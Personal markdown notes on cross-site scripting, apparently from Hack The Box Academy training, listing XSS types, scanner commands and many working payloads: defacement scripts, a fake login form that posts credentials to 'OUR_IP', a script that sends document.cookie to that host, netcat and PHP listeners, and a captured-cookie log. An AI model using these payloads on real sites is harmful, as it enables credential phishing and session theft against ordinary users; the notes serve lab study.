# cross site scripting or xss

# resources
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md
- https://github.com/payloadbox/xss-payload-list
    - contains payload list
- https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

- XSS vulnerabilities take advantage of a flaw in user input sanitization to "write" JavaScript code to the page and execute it on the client side, leading to several types of attacks.
- types
    - persistent
        - `Stored XSS` The most critical type of XSS, which occurs when user input is stored on the back-end database and then displayed upon retrieval (e.g., posts or comments)
    - non-persistent
        - `Reflected XSS` Occurs when user input is displayed on the page after being processed by the backend server, but without being stored (e.g., search result or error message)
        - `DOM-based XSS` Another Non-Persistent XSS type that occurs when user input is directly shown in the browser and is completely processed on the client-side, without reaching the back-end server (e.g., through client-side HTTP parameters or anchor tags)
- payloads
    - Basic XSS Payload 
        - `<script>alert(window.origin)</script>`
        - `<plaintext>`
        - `<script>print()</script>`
    - get cookie `<script>alert(document.cookie);</script>`
    - html based xss `<img src="" onerror=alert(document.cookie)>`
    - change background color `<script>document.body.style.background = "#141d2b"</script>`
    - Change Background Image `<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script> 	`
    - Change Website Title `<script>document.title = 'HackTheBox Academy'</script> 	`
    - Overwrite website's main body `<script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script> 	`
    - Remove certain HTML element `<script>document.getElementById('urlform').remove();</script> `
    - Load remote script `<script src="http://OUR_IP/script.js"></script>`
    - Send Cookie details to us `<script>new Image().src='http://OUR_IP/index.php?c='+document.cookie</script> 	`
- discovery tools
    - [XSStrike](https://github.com/s0md3v/XSStrike)
        - `git clone https://github.com/s0md3v/XSStrike.git`
        - `pip install -r requirements.txt`
        - `sudo apt install python3-fuzzywuzzy`
        - `python /usr/share/XSStrike/xsstrike.py --url "http://83.136.251.170:37403/index.php?fullname=aaa&username=bbb&password=ccc&email=ddd%40ddd.com"`
    - [BruteXSS](https://github.com/rajeshmajumdar/BruteXSS)
    - [xsser](https://github.com/epsylon/xsser)
- defacement
    - `<script>document.body.style.background = "#141d2b"</script>`
    - `<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>`
    - `<script>document.title = 'HackTheBox Academy'</script>`
    - `<script>document.getElementById("todo").innerHTML = "New Text";</script>`
    - `<script>document.getElementsByTagName('body')[0].innerHTML = '<center><h1 style="color: white">Cyber Security Training</h1><p style="color: white">by <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt="HTB Academy"> </p></center>'</script>`
- phishing
    - setup up kali to get ready for creds
        - `sudo nc -lvnp 80`
        - or copy [capture-creds.php](assets/attachments/kb/htb/redteam/assets/techniques/xss/capture-creds.php), rename to index.php and create temp php server
            - `mkdir /tmp/tmpserver && cd /tmp/tmpserver`
            - `sudo php -S 0.0.0.0:80`
    - payloads
        - `document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');`
        - hide the page content `document.getElementById('urlform').remove();`
        - complete payload `document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();`
- session hijacking
    - find field that can be used to inject xss - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
        - capture responses `sudo php -S 0.0.0.0:80`
        - inject to find vulnerable fields `"><script src=http://10.10.15.199/script.js></script>`
        - script.js contains `new Image().src='http://OUR_IP/index.php?c='+document.cookie`
        - cookie is captured `[Fri Nov  1 14:24:09 2024] 10.129.84.227:44700 [200]: GET /index.php?c=cookie=c00k1355h0u1d8353cu23d`
- 








	
 	
